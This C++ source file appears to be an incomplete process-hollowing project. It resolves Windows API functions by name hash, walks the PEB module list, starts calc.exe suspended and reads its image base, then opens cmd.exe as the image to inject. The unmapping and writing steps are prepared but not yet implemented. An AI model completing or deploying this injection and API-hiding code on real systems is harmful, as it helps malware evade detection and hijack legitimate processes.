#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <intrin.h>
//#include <windows.h>
//#include <winternl.h>
#include "ModuleIterator.hpp" // Iterator class used to iterate over the module list
#include "CheckSumGen.hpp"    // Header file with the functions I used to generate the checksum
#include "IAT.hpp"			  // IAT simulator

// Comment this line below to enable debug messages, and vice-versa
//#define TRACE
//#define TRACE_PEB

template <typename T>
T retrieve_function_by_hash(unsigned long funcHash, const char* base, const wchar_t* modName) {
	// Retrieve ntHeader
	const WinDecls::IMAGE_NT_HEADERS* ntHeaders = (const WinDecls::IMAGE_NT_HEADERS*)(base + ((WinDecls::IMAGE_DOS_HEADER*)base)->e_lfanew);
	// Retrieve first entry on DATA_DIRECTORY list
	const WinDecls::IMAGE_DATA_DIRECTORY dataDir = (const WinDecls::IMAGE_DATA_DIRECTORY)(ntHeaders->OptionalHeader.DataDirectory[0]);
	// Retrieve the RVA from this entry (the first entry on DataDirectory is the EXPORT_DIRECTORY)
	const unsigned long exportDirRVA = dataDir.VirtualAddress;

	// If exportDirRVA is NULL, it means the file doesn't have an export table, that means it's probably the current module
	if (exportDirRVA == NULL) {
#if defined(TRACE)
		wprintf(L"[-] Couldn't find export directory on module \"%s\", skipping...\n", modName);
#endif
		return NULL;
	}

	// Retrieve export directory
	const WinDecls::IMAGE_EXPORT_DIRECTORY* exportDir = (const WinDecls::IMAGE_EXPORT_DIRECTORY*)(base + exportDirRVA);
	// Retrieve NumberOfNames
	unsigned long NumberOfNames = exportDir->NumberOfNames;
	// Retrieve RVA to string table
	const unsigned long RVAOfNames = exportDir->AddressOfNames;

#if defined(TRACE)
	wprintf(L"NumberOfNames in \"%s\" = %d\n", modName, NumberOfNames);
#endif
	// Iterate over the string table, comparing the strings with the one we want to find
	for (int index = NumberOfNames - 1; index >= 0; index--) {
		// Had to use reinterpret_cast here, otherwise VS wouldn't compile
		// Retrieve symbol name @ index on string table
		const char* namePtr = (const char*)(base + reinterpret_cast<const unsigned long*>(base + RVAOfNames)[index]);
		unsigned long checkSum = check_sum_gen(namePtr);

#if defined(TRACE)
		printf("[%d] = \"%s\"\n", index, namePtr);
#endif

		//Compares with our intended function
		if ( check_sum_is_eq(checkSum, funcHash) ) {
			// Retrieve pointer to ordinal Table
			const unsigned short* ordTable = (const unsigned short*)(base + exportDir->AddressOfNameOrdinals);
			// Retrieve pointer to RVA table
			const unsigned long* funcPtrTable = (const unsigned long*)(base + exportDir->AddressOfFunctions);

			// Retrieve and return function pointer
			return (T)(base + funcPtrTable[ordTable[index]]);
		}
	}
	// If no function was found, return NULL
	return NULL;
}

template <typename T>
T iterate_modules(unsigned long funcHash, ModuleIterator& iter) {
	do {
		// Retrieve module base addr
		const char* base = iter.get_base();
		// Retrieve module name
		const wchar_t* modName = iter.get_modName();

		// Looks for function inside module, and if found, return and reset iterator to base module
		// If you are patient enough you could elaborate a correct order of import so you wouldn't need to reset the iterator after every function found
		// It would drastically improve performance
		T funcPtr = retrieve_function_by_hash<T>(funcHash, base, modName);
		if (funcPtr != NULL) {
			iter.reset();
			return funcPtr;
		}

		iter.next();
	} while (iter.get_base() != NULL);

	return NULL;
}

LoadLibrary_t pLoadLibrary;
MessageBox_t  pMessageBox;
VirtualAlloc_t pVirtualAlloc;
VirtualProtect_t pVirtualProtect;
CreateProcessA_t pCreateProcessA;
GetProcAddress_t pGetProcAddress;
GetModuleHandleA_t pGetModuleHandle;
ZwUnmapViewOfSection_t pZwUnmapViewOfSection;
NtQueryInformationProcess_t pNtQueryInformationProcess;
ReadProcessMemory_t pReadProcessMemory;
CreateFileA_t pCreateFileA;
GetFileSize_t pGetFileSize;
ReadFile_t pReadFile;

int main(int argc, char **argv) {
	// ================ PRE-CALCULATED CHECKSUM OF NAMES OF FUNCS ================================
	// Checksum of the functions we want to retrieve
	// check_sum_gen("LoadLibraryA") = 0x8dbeba00 and so on and so forth
	const unsigned long hLoadLibraryA			   = 0x8dbeba00;
	const unsigned long hMessageBoxA			   = 0xf6c562e0;
	const unsigned long hVirtualAlloc			   = 0x10f64400;
	const unsigned long hVirtualprotect			   = 0x59664000;
	const unsigned long hCreateProcessA			   = 0xf22c4080;
	const unsigned long hGetProcAddress			   = 0x68b4800;
	const unsigned long hGetModuleHandleA		   = 0xdffe0000;
	const unsigned long hZwUnmapViewOfSection	   = 0xc9f17c00;
	const unsigned long hNtQueryInformationProcess = 0xcc874000;
	const unsigned long hReadProcessMemory		   = 0xb2a77d00;
	const unsigned long hCreateFileA			   = 0x728895c0; 
	const unsigned long hGetFileSize			   = 0x1fb6ef40; 
	const unsigned long hReadFile				   = 0xf01ce140;
	const unsigned long hHeapAlloc				   = 0x8c00e000;
	const unsigned long hGetProcessHeap			   = 0x53e78000;
	const unsigned long hVirtualAllocEx			   = 0xaf28c000;
	const unsigned long hWriteProcessMemory		   = 0x28194f00;
	const unsigned long hGetThreadContext		   = 0x29e00000;
	const unsigned long hSetThreadContext		   = 0x53600000;
	const unsigned long hResumeThread			   = 0x1ff2800;

	/*const unsigned long hHeapAlloc = check_sum_gen("HeapAlloc");
	const unsigned long hGetProcessHeap = check_sum_gen("GetProcessHeap");
	const unsigned long hVirtualAllocEx = check_sum_gen("VirtualAllocEx");
	const unsigned long hWriteProcessMemory = check_sum_gen("WriteProcessMemory");
	const unsigned long hGetThreadContext = check_sum_gen("GetThreadContext");
	const unsigned long hResumeThread = check_sum_gen("ResumeThread");
	const unsigned long hSetThreadContext = check_sum_gen("SetThreadContext");

	printf("HeapAlloc = %x\n", hHeapAlloc);
	printf("GetProcessHeap = %x\n", hGetProcessHeap);
	printf("VirtualAllocEx = %x\n", hVirtualAllocEx);
	printf("WriteProcessMemory = %x\n", hWriteProcessMemory);
	printf("GetThreadContext = %x\n", hGetThreadContext);
	printf("SetThreadContext = %x\n", hSetThreadContext);
	printf("ResumeThread = %x\n", hResumeThread);

	exit(1);*/
	// ===========================================================================================
	
	// ================================= RETRIEVE POINTER TO PEB =================================
	// Read PEB at fs:[0x30]
	const WinDecls::PEB_T* pebPtr = (WinDecls::PEB_T*)__readfsdword(0x30);
	const unsigned long baseAddr = pebPtr->ImageBaseAddress;

#if defined(TRACE_PEB)
	printf("[+] Local PEB @: %x\n", pebPtr);
	printf("[+] Local ImageBaseAddres @: %x\n", baseAddr);
#endif

	// Retrieve LDR_DATA structure
	const WinDecls::PEB_LDR_DATA_T* Ldr = pebPtr->Ldr;
	// Retrieve the first link and typecast to an entry type
	const WinDecls::LDR_DATA_TABLE_ENTRY_T* modPtr = (const WinDecls::LDR_DATA_TABLE_ENTRY_T*)(Ldr->InLoadOrderModuleList.Flink);
	// ===========================================================================================

	// =============================== RETRIEVE FUNCTION POINTERS ================================
	// Instantiate the iterator class
	ModuleIterator iter(modPtr, Ldr);

	pLoadLibrary = iterate_modules<LoadLibrary_t>(hLoadLibraryA, iter);
	pCreateProcessA = iterate_modules<CreateProcessA_t>(hCreateProcessA, iter);
	pGetProcAddress = iterate_modules<GetProcAddress_t>(hGetProcAddress, iter);
	pGetModuleHandle = iterate_modules<GetModuleHandleA_t>(hGetModuleHandleA, iter);
	pZwUnmapViewOfSection = iterate_modules<ZwUnmapViewOfSection_t>(hZwUnmapViewOfSection, iter);
	pNtQueryInformationProcess = iterate_modules<NtQueryInformationProcess_t>(hNtQueryInformationProcess, iter);
	pReadProcessMemory = iterate_modules<ReadProcessMemory_t>(hReadProcessMemory, iter);
	pCreateFileA = iterate_modules<CreateFileA_t>(hCreateFileA, iter);
	pGetFileSize = iterate_modules<GetFileSize_t>(hGetFileSize, iter);
	pReadFile = iterate_modules<ReadFile_t>(hReadFile, iter);
	// ===========================================================================================

	// ====================== CREATE DESTINATION PROCESS AS SUSPENDED ============================
	unsigned long CREATE_SUSPENDED = 0x00000004;
	unsigned long DETACHED_PROCESS = 0x00000008;
	
	WinDecls::STARTUPINFOA* pStartupInfo = new WinDecls::STARTUPINFOA();
	pStartupInfo->dwFlags = 0x00000001;     //STARTF_USESHOWWINDOW;
	pStartupInfo->wShowWindow = 5;		   //SW_SHOW;
	WinDecls::PROCESS_INFORMATION* pProcessInfo = new WinDecls::PROCESS_INFORMATION();
	pCreateProcessA("C:\\Windows\\System32\\calc.exe", NULL, 0, 0, 0, CREATE_SUSPENDED, 0, 0, pStartupInfo, pProcessInfo);
	if (!pProcessInfo->hProcess) {
		printf("[-] Failed to create process\n");
		exit(1);
	}
	printf("[+] Process calc.exe created with PID: %u\n", pProcessInfo->dwProcessId);
	// ===========================================================================================

	// ===================== RETRIEVE DESTINATION PROCESS PEB BASE ADDR ==========================
	printf("[+] Querying information about the process\n");
	WinDecls::PROCESS_BASIC_INFORMATION* pBasicInfo = new WinDecls::PROCESS_BASIC_INFORMATION();
	unsigned long* retLength = NULL;
	unsigned long farProc = pNtQueryInformationProcess(pProcessInfo->hProcess, 0, pBasicInfo, sizeof(WinDecls::PROCESS_BASIC_INFORMATION), retLength);

	unsigned long remotePeb = (unsigned long)pBasicInfo->Peb;
	printf("[+] PEB of destination process is located @ %x\n", remotePeb);
	// ===========================================================================================


	// =============== READ DESTINATION PROCESS PEB AND FETCH IMAGE BASE ADDRESS =================
	char BUFF[0x2000];
	unsigned int* bytesRead = NULL;
	bool readResult = pReadProcessMemory(pProcessInfo->hProcess, (const void*)remotePeb, &BUFF, sizeof(WinDecls::PEB_T), bytesRead);

	const auto destPeb = (WinDecls::PEB_T*)BUFF;
	const unsigned long destBaseAddr = destPeb->ImageBaseAddress;
	// ===========================================================================================

	// ======================= SOURCE FILE (THE ONE TO BE EXECUTED ROUNTINE ======================
	// ==================================== READ SOURCE FILE =====================================
	unsigned long GENERIC_READ = 0x80000000;
	unsigned long OPEN_ALWAYS  = 0x4;
	void* sourceFile = pCreateFileA("C:\\Windows\\System32\\cmd.exe", GENERIC_READ, NULL, NULL, OPEN_ALWAYS, NULL, NULL);
	unsigned long sourceFileSize = pGetFileSize(sourceFile, NULL);


	// ===========================================================================================

	printf("end\n");



	return 0;
}
